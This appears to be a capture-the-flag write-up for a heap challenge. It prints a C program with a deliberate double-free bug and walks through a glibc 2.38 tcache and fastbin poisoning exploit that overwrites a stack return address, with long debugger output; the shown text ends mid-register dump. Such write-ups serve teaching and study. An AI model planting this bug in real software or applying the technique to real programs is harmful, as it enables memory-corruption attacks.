# Solution

So this will be a walkthrough, one way to solve this challenge. There are definitely a ton of different ways you can solve this challenge.

One thing to note. In the solution script, there are a lot of hard coded offsets. These offsets pertain to a binary generated from compiling the source code. If you recompile the binary (which you likely will have to), those offsets will change. Most of these offsets, you find them the same way you do in previous writeups, so I will not recover it here. The new offsets you will need, I'll show you in here.

## Looking at the program

So let's first understand what this program is, what we can do, and what bugs we have.

This is pretty similar to the previous three challenges. The difference here is the bug. The bug is a double free. In addition to the `chunks` and `chunk_sizes` array, there is a `chunk_in_use` boolean array. This array is checked in the `edit/view` functions. So, we can't edit/view freed chunks. However it isn't checked with the freeing functionality, so we can free the same chunk multiple times:

```
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "chall-03.h"

char *chunks[MAX_CHUNK_IDX];
unsigned int chunk_sizes[MAX_CHUNK_IDX];
bool chunk_in_use[MAX_CHUNK_IDX];

void main(void) {
    unsigned int menu_choice;

    while (1 == 1) {
        puts("Menu:\n1.) Allocate New Chunk\n2.) View Chunk\n3.) Edit Chunk\n4.) Free Chunk\n5.) Remove Chunk\n");
        puts("Please enter menu choice:");
        menu_choice = get_uint();

        if (menu_choice == ALLOCATE) {
            allocate_chunk();
        }

        else if (menu_choice == VIEW) {
            view_chunk();
        }

        else if (menu_choice == EDIT) {
            edit_chunk();
        }

        else if (menu_choice == FREE) {
            free_chunk();
        }

        else if (menu_choice == REMOVE) {
            remove_chunk();
        }    

        else if (menu_choice == SECRET) {
            secret();
        }    

        else {
            printf("Unknown Menu Choice: %d\n", menu_choice);   
        }
    }
}

void you_win(void) {
    puts("Call this function to win!");

    puts("\n\nYou Win\n\n");
}

unsigned int get_uint(void) {
    char buf[20];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return (unsigned int)atoi(buf);
}

unsigned int get_chunk_idx(void) {
    unsigned chunk_idx;
    char *chunk;

    puts("Which chunk idx would you like?");
    chunk_idx = get_uint();


    if ((chunk_idx <= MAX_CHUNK_IDX)) {
        printf("You choose idx: %u\n\n", chunk_idx);
    }

    else {
        puts("Bad Chunk IDX\n");
        return -1;
    }

    chunk = chunks[chunk_idx];

    if (chunk == NULL) {
        puts("Chunk doesn't exist.\n");
        return -1;
    }

    else {
        return chunk_idx;
    }

}

void allocate_chunk(void) {
    unsigned int new_chunk_size, chunk_idx;
    char *new_chunk;

    puts("Allocating a new chunk!\n");

    printf("Enter the chunk size between 0x%x-0x%x:\n",
        MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

    new_chunk_size = get_uint();

    if ((new_chunk_size > MIN_CHUNK_SIZE) && (new_chunk_size < MAX_CHUNK_SIZE)) {
        printf("Chunk Size: 0x%x\n\n", new_chunk_size);
    }

    else {
        puts("You have inputed a bad chunks size.\n");
        return;
    }

    puts("Which chunk spot would you like to allocate?");
    chunk_idx = get_uint();

    if ((chunk_idx < MAX_CHUNK_IDX)) {
        printf("Choosen chunk idx: 0x%x\n\n", chunk_idx);
    }

    else {
        puts("Bad Chunk IDX\n");
        return;
    }

    if (chunks[chunk_idx] != NULL) {
        puts("Chunk already exists there!\n");
        return;
    }

    new_chunk = malloc(new_chunk_size);
    chunks[chunk_idx] = new_chunk;
    chunk_sizes[chunk_idx] = new_chunk_size;
    chunk_in_use[chunk_idx] = true;

    puts("Chunk has been allocated!\n");

}

void view_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Viewing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    if (chunk_in_use[chunk_idx] == false) {
        puts("Chunk is not in use.\n");
        return;
    }

    chunk = chunks[chunk_idx];

    printf("Chunk Contents: %s\x0d\x0a\n", chunk);
}

void edit_chunk(void) {
    unsigned int chunk_idx, chunk_size;
    char *chunk;

    puts("Editing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunk = chunks[chunk_idx];
    chunk_size = chunk_sizes[chunk_idx];

    if (chunk_in_use[chunk_idx] == false) {
        puts("Chunk is not in use.\n");
        return;
    }

    puts("Please input new chunk content:\n");

    fgets(chunk, chunk_size, stdin);

    puts("\nChunk has been edited!\n");
}

void free_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Freeing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunk = chunks[chunk_idx];
    chunk_in_use[chunk_idx] = false;
    free(chunk);

    puts("Chunk has been freed!\n");
}

void remove_chunk(void) {
    unsigned int chunk_idx;

    puts("Removing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunks[chunk_idx] = NULL;
    chunk_in_use[chunk_idx] = false;
    chunk_sizes[chunk_idx] = 0x00;

    puts("Chunk has been removed!\n");
}

void secret(void) {
    unsigned int chunk_idx, choice;
    char *chunk;
    char buf[20];

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.");
        return;
    }

    chunk = chunks[chunk_idx];

    puts("Choice?");

    fgets(buf, sizeof(buf) - 1, stdin);
    choice = (unsigned int)atoi(buf);

    if (choice == 0xd3) {
        *((unsigned int **)chunk) = (&choice);
    }

    else if (choice == 0x83) {
        *((void (**)(void))chunk) = (&secret);
    }
}
```

With this being the header file:

```
#define ALLCOATE 0x00
#define ALLOCATE 0x01
#define VIEW 0x02
#define EDIT 0x03
#define FREE 0x04
#define REMOVE 0x05
#define SECRET 0x06

#define MAX_CHUNK_IDX 20
#define MAX_CHUNK_SIZE 0x5f0
#define MIN_CHUNK_SIZE 0x00

void allocate_chunk();
void view_chunk();
void edit_chunk();
void free_chunk();
void remove_chunk();
void secret();

unsigned int get_uint();
void you_win();
```

That being said, we still have the same allocation/freeing/edit/view/remove/secret functionality we've seen in the previous challs.

## How will we pwn this?

So, how will we use the double free bug, in order to get code execution.

First off, we will get a heap infoleak via reallocating a tcache chunk. When a tcache chunk is reallocated, it will clear out the tcache key, but not the mangled next ptr. For this, we will use a chunk, that is the last chunk in it's tcache bin. That way, the next chunk that it points to, is `0x00`. That way, the mangled next ptr we get, will be `(chunk_ptr >> 12) ^ 0x00 = (chunk_ptr >> 12)`. So we can take that value, shift if over to the left by `12` bits. Now, there are the lower `12` bits that we need to also come up with.

Luckily for us, ASLR in the heap doesn't appear to apply to the lower `12` bits:

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x000055a58dbfa000 0x000055a58dbfb000 0x0000000000000000 r-- /Hackery/shogun/challs/03/chall-03
0x000055a58dbfb000 0x000055a58dbfc000 0x0000000000001000 r-x /Hackery/shogun/challs/03/chall-03
0x000055a58dbfc000 0x000055a58dbfd000 0x0000000000002000 r-- /Hackery/shogun/challs/03/chall-03
0x000055a58dbfd000 0x000055a58dbfe000 0x0000000000002000 r-- /Hackery/shogun/challs/03/chall-03
0x000055a58dbfe000 0x000055a58dbff000 0x0000000000003000 rw- /Hackery/shogun/challs/03/chall-03
0x000055a58fa3a000 0x000055a58fa5b000 0x0000000000000000 rw- [heap]
0x00007f7f0a600000 0x00007f7f0a622000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a622000 0x00007f7f0a772000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a772000 0x00007f7f0a7c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a7c8000 0x00007f7f0a7c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a7c9000 0x00007f7f0a82c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a82c000 0x00007f7f0a82e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f7f0a82e000 0x00007f7f0a83b000 0x0000000000000000 rw-
0x00007f7f0a849000 0x00007f7f0a84e000 0x0000000000000000 rw-
0x00007f7f0a84e000 0x00007f7f0a84f000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f7f0a84f000 0x00007f7f0a875000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f7f0a875000 0x00007f7f0a87f000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f7f0a880000 0x00007f7f0a882000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f7f0a882000 0x00007f7f0a884000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffed1818000 0x00007ffed1839000 0x0000000000000000 rw- [stack]
0x00007ffed19e0000 0x00007ffed19e4000 0x0000000000000000 r-- [vvar]
0x00007ffed19e4000 0x00007ffed19e6000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

This is evident, with the fact, that every time we run it, the lower `12` bits of the ASLR base is always `0x00`. So, since the lower `12` bits of the don't have aslr, they shouldn't change. So we can just find the lower `12` bits of the address in gdb, and use that.

As for how we will use the double free bug. We will first, fill up a tcache bin. Then, we will insert a chunk into the corresponding fastbin. We will free a different chunk, and insert it into the same fastbin. Then, we will free the first chunk we inserted into that fasbtin. This is because, the double free check for fastbins, is just the chunk being inserted is not the same as the fastbin head chunk. This is easier for us to pass, versus the tcache double free check with the key (since we would need to modify the freed chunk to pass that).

So now we have the same chunk inserted twice into the same fastbin. First, we will allocate the first chunk from the fastbin (of course, we will need to empty out the corresponding tcache we filled up to get chunks into the fastbin). Of course, this will move the remaining two chunks over to the corresponding tcache. Now, we will have an allocated chunk, that is also present in the tcache bin. We can just edit that chunk that is present in the tcache bin, to modify the next ptr to `chunks` (we got PIE/Stack infoleaks from the secret functionality). Then, we can just allocate chunks, until we get a ptr to the `chunks` array. Then we can just do the same stack return address overwrite, we've done for the previous challs.

When we start off with our two fastbin chunks (one inserted three times) we have this. These two chunks will form a loop:

```
chunk0 -> fastbin head
chunk1
chunk0 -> loop
```

Then, we go ahead and allocate `chunk0`. The other two chunks will get moved over to the tcache, and look like this:

```
chunk1 -> tcache head
chunk0
```

Now, we have `chunk0` allocated, so we will go ahead and modify the next ptr to point to chunks:

```
chunk1 -> tcache head
chunk0
chunks
```

Then we just allocate three chunks from that tcache bin, and we will get a ptr to `chunks`.

Let's see this in action:

```
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=4, size=0x60, count=7] ←  Chunk(addr=0x560223320900, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233208a0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320840, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233207e0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320780, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320720, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233206c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7f4a29a2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233209c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f4a29a2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x0000560223127000 0x0000560223128000 0x0000000000000000 r-- /Hackery/shogun/challs/03/chall-03
0x0000560223128000 0x0000560223129000 0x0000000000001000 r-x /Hackery/shogun/challs/03/chall-03
0x0000560223129000 0x000056022312a000 0x0000000000002000 r-- /Hackery/shogun/challs/03/chall-03
0x000056022312a000 0x000056022312b000 0x0000000000002000 r-- /Hackery/shogun/challs/03/chall-03
0x000056022312b000 0x000056022312c000 0x0000000000003000 rw- /Hackery/shogun/challs/03/chall-03
0x000056022331f000 0x0000560223340000 0x0000000000000000 rw- [heap]
0x00007f4a29800000 0x00007f4a29822000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a29822000 0x00007f4a29972000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a29972000 0x00007f4a299c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a299c8000 0x00007f4a299c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a299c9000 0x00007f4a29a2c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a29a2c000 0x00007f4a29a2e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f4a29a2e000 0x00007f4a29a3b000 0x0000000000000000 rw-
0x00007f4a29b37000 0x00007f4a29b3c000 0x0000000000000000 rw-
0x00007f4a29b3c000 0x00007f4a29b3d000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f4a29b3d000 0x00007f4a29b63000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f4a29b63000 0x00007f4a29b6d000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f4a29b6e000 0x00007f4a29b70000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f4a29b70000 0x00007f4a29b72000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffc0665a000 0x00007ffc0667b000 0x0000000000000000 rw- [stack]
0x00007ffc0670e000 0x00007ffc06712000 0x0000000000000000 r-- [vvar]
0x00007ffc06712000 0x00007ffc06714000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  x/4g 0x5602233206b0
0x5602233206b0: 0x0 0x61
0x5602233206c0: 0x560223320 0x95d3db55a50d3a0a
```

So first off, we see our `7` tcache bin chunks, and the `3` fastbin chunks, which form a loop.

We see that the `0x5602233206c0` chunk is the last chunk in the tcache bin, so we'll use that for the heap infoleak. Its next ptr is `0x560223320`, which is `0x560223320 << 12 = 0x560223320000`. The lower `12` bits of the chunk address is `0x5602233206c0 & 0x0fff = 0x6c0`. Since ASLR doesn't apply in this context to the lower `12` bits, and the mangled next ptr is to `0x00` (it is the last chunk in the tcache bin), we have `((0x5602233206c0 >> 12) ^ 0x00) = 0x560223320`, or the other way around `(0x560223320 << 12) + 0x6c0`.

Let's empty out the tcache bin:

```
gef➤  p (char *)chunks
$1 = 0x560223320900 "\200;\020C\aV"
gef➤  search-pattern 0x560223320900
[+] Searching '\x00\x09\x32\x23\x02\x56' in memory
[+] In '/Hackery/shogun/challs/03/chall-03'(0x56022312b000-0x56022312c000), permission=rw-
  0x56022312b040 - 0x56022312b058  →   "\x00\x09\x32\x23\x02\x56[...]"
gef➤  x/20g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900  0x5602233208a0
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x0
0x56022312b090 <chunks+80>: 0x0 0x0
0x56022312b0a0 <chunks+96>: 0x0 0x0
0x56022312b0b0 <chunks+112>:    0x0 0x0
0x56022312b0c0 <chunks+128>:    0x0 0x0
0x56022312b0d0 <chunks+144>:    0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f4a29a2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233209c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f4a29a2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10g 0x5602233206b0
0x5602233206b0: 0x0 0x61
0x5602233206c0: 0x560223320 0x0
0x5602233206d0: 0x0 0x0
0x5602233206e0: 0x0 0x0
0x5602233206f0: 0x0 0x0
```

So we seem only the fastbin chunks remain. We also see that the `0x5602233206c0` chunk allocated, does indeed have the leak value we need (the tcache key got cleared out). Let's allocate a chunk from the fastbin (`0x560223320960`):

```
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=4, size=0x60, count=2] ←  Chunk(addr=0x5602233209c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5602233209c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
─────────────────────────────── Fastbins for arena at 0x7f4a29a2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f4a29a2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900  0x5602233208a0
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x560223320960
0x56022312b090 <chunks+80>: 0x0 0x0
0x56022312b0a0 <chunks+96>: 0x0 0x0
0x56022312b0b0 <chunks+112>:    0x0 0x0
0x56022312b0c0 <chunks+128>:    0x0 0x0
0x56022312b0d0 <chunks+144>:    0x0 0x0
```

So we are able to allocate the `0x560223320960` chunk (we see we have multiple chunks in the `chunks` array that point to, but not all of them are in use). Let's go ahead and edit the next ptr for `0x560223320960`:

```
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=4, size=0x60, count=3] ←  Chunk(addr=0x5602233209c0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x560223320960, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x56022312b040, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x56022312b040]
─────────────────────────────── Fastbins for arena at 0x7f4a29a2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f4a29a2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900
gef➤  x/20g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900  0x5602233208a0
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x560223320960
0x56022312b090 <chunks+80>: 0x0 0x0
0x56022312b0a0 <chunks+96>: 0x0 0x0
0x56022312b0b0 <chunks+112>:    0x0 0x0
0x56022312b0c0 <chunks+128>:    0x0 0x0
0x56022312b0d0 <chunks+144>:    0x0 0x0
```

So we see we were able to add `chunks` (`0x56022312b040`) into the tcache bin. It is the third chunk, so we will need to allocate three chunks from this tcache bin to get that ptr, so let's do those allocations:

```
gef➤  x/20g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900  0x0
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x560223320960
0x56022312b090 <chunks+80>: 0x5602233209c0  0x560223320960
0x56022312b0a0 <chunks+96>: 0x56022312b040  0x0
0x56022312b0b0 <chunks+112>:    0x0 0x0
0x56022312b0c0 <chunks+128>:    0x0 0x0
0x56022312b0d0 <chunks+144>:    0x0 0x0
gef➤  x/10g 0x56022312b040
0x56022312b040 <chunks>:    0x560223320900  0x0
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x560223320960
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
[!] Command 'heap bins tcache' failed to execute properly, reason: Cannot access memory at address 0x56074310381b
─────────────────────────────── Fastbins for arena at 0x7f4a29a2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f4a29a2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f4a29a2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we seem to have allocated three chunks, and the ptr at `0x56022312b0a0` is `0x56022312b040`, which is to `chunks`. Let's write a ptr to the stack return address of `edit_chunk`:

```
gef➤  x/10g 0x56022312b040
0x56022312b040 <chunks>:    0x7ffc06678c08  0xa
0x56022312b050 <chunks+16>: 0x560223320840  0x5602233207e0
0x56022312b060 <chunks+32>: 0x560223320780  0x560223320720
0x56022312b070 <chunks+48>: 0x5602233206c0  0x560223320960
0x56022312b080 <chunks+64>: 0x5602233209c0  0x560223320960
gef➤  disas edit_chunk
Dump of assembler code for function edit_chunk:
   0x00005602231285de <+0>: endbr64
   0x00005602231285e2 <+4>: push   rbp
   0x00005602231285e3 <+5>: mov rbp,rsp
   0x00005602231285e6 <+8>: sub rsp,0x10
   0x00005602231285ea <+12>:    lea rax,[rip+0xc88]     # 0x560223129279
   0x00005602231285f1 <+19>:    mov rdi,rax
   0x00005602231285f4 <+22>:    call   0x5602231280c0 <puts@plt>
   0x00005602231285f9 <+27>:    call   0x56022312835d <get_chunk_idx>
   0x00005602231285fe <+32>:    mov DWORD PTR [rbp-0x10],eax
   0x0000560223128601 <+35>:    cmp DWORD PTR [rbp-0x10],0xffffffff
   0x0000560223128605 <+39>:    jne 0x56022312861b <edit_chunk+61>
   0x0000560223128607 <+41>:    lea rax,[rip+0xc23]     # 0x560223129231
   0x000056022312860e <+48>:    mov rdi,rax
   0x0000560223128611 <+51>:    call   0x5602231280c0 <puts@plt>
   0x0000560223128616 <+56>:    jmp 0x5602231286a9 <edit_chunk+203>
   0x000056022312861b <+61>:    mov eax,DWORD PTR [rbp-0x10]
   0x000056022312861e <+64>:    lea rdx,[rax*8+0x0]
   0x0000560223128626 <+72>:    lea rax,[rip+0x2a13]        # 0x56022312b040 <chunks>
   0x000056022312862d <+79>:    mov rax,QWORD PTR [rdx+rax*1]
   0x0000560223128631 <+83>:    mov QWORD PTR [rbp-0x8],rax
   0x0000560223128635 <+87>:    mov eax,DWORD PTR [rbp-0x10]
   0x0000560223128638 <+90>:    lea rdx,[rax*4+0x0]
   0x0000560223128640 <+98>:    lea rax,[rip+0x2a99]        # 0x56022312b0e0 <chunk_sizes>
   0x0000560223128647 <+105>:   mov eax,DWORD PTR [rdx+rax*1]
   0x000056022312864a <+108>:   mov DWORD PTR [rbp-0xc],eax
   0x000056022312864d <+111>:   mov eax,DWORD PTR [rbp-0x10]
   0x0000560223128650 <+114>:   lea rdx,[rip+0x2ad9]        # 0x56022312b130 <chunk_in_use>
   0x0000560223128657 <+121>:   movzx  eax,BYTE PTR [rax+rdx*1]
   0x000056022312865b <+125>:   xor eax,0x1
   0x000056022312865e <+128>:   test   al,al
   0x0000560223128660 <+130>:   je  0x560223128673 <edit_chunk+149>
   0x0000560223128662 <+132>:   lea rax,[rip+0xbe4]     # 0x56022312924d
   0x0000560223128669 <+139>:   mov rdi,rax
   0x000056022312866c <+142>:   call   0x5602231280c0 <puts@plt>
   0x0000560223128671 <+147>:   jmp 0x5602231286a9 <edit_chunk+203>
   0x0000560223128673 <+149>:   lea rax,[rip+0xc16]     # 0x560223129290
   0x000056022312867a <+156>:   mov rdi,rax
   0x000056022312867d <+159>:   call   0x5602231280c0 <puts@plt>
   0x0000560223128682 <+164>:   mov rdx,QWORD PTR [rip+0x2997]      # 0x56022312b020 <stdin@GLIBC_2.2.5>
   0x0000560223128689 <+171>:   mov ecx,DWORD PTR [rbp-0xc]
   0x000056022312868c <+174>:   mov rax,QWORD PTR [rbp-0x8]
   0x0000560223128690 <+178>:   mov esi,ecx
   0x0000560223128692 <+180>:   mov rdi,rax
   0x0000560223128695 <+183>:   call   0x5602231280f0 <fgets@plt>
   0x000056022312869a <+188>:   lea rax,[rip+0xc10]     # 0x5602231292b1
   0x00005602231286a1 <+195>:   mov rdi,rax
   0x00005602231286a4 <+198>:   call   0x5602231280c0 <puts@plt>
   0x00005602231286a9 <+203>:   leave  
   0x00005602231286aa <+204>:   ret    
End of assembler dump.
gef➤  b *edit_chunk+183
Breakpoint 1 at 0x560223128695
gef➤  c
Continuing.
```

So we see, we have a ptr to the stack return address in `chunks`. Let's see the saved stack return address overwrite:

```
Breakpoint 1, 0x0000560223128695 in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
$rbx   : 0x0             
$rcx   : 0x50            
$rdx   : 0x00007f4a29a2cac0  →  0x00000000fbad2088
